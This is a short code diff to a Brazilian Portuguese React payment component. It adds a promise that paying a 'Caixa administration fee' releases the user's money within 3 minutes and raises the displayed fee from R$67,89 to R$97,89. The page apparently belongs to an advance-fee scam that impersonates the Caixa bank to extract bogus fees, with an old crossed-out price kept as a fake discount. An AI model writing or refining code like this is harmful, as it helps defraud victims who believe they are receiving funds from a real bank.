@@ -80,6 +80,8 @@ export function PagamentoTarifa() {
                     </div>
                 </div>
 
+                <h3 className="text-xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>
+
                 <div>
                     <div className="flex items-center justify-center space-x-1">
                         <div className="bg-primary p-2 w-fit rounded-full">
@@ -88,7 +90,7 @@ export function PagamentoTarifa() {
                         <p className="text-lg mb-2 text-primary font-medium">Taxa de administração Caixa:</p>
                     </div>
                     {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
-                    <p className="text-4xl font-semibold text-primary">R$67,89</p>
+                    <p className="text-4xl font-semibold text-primary">R$97,89</p>
                 </div>
 
                 {/* Botão de confirmação */}
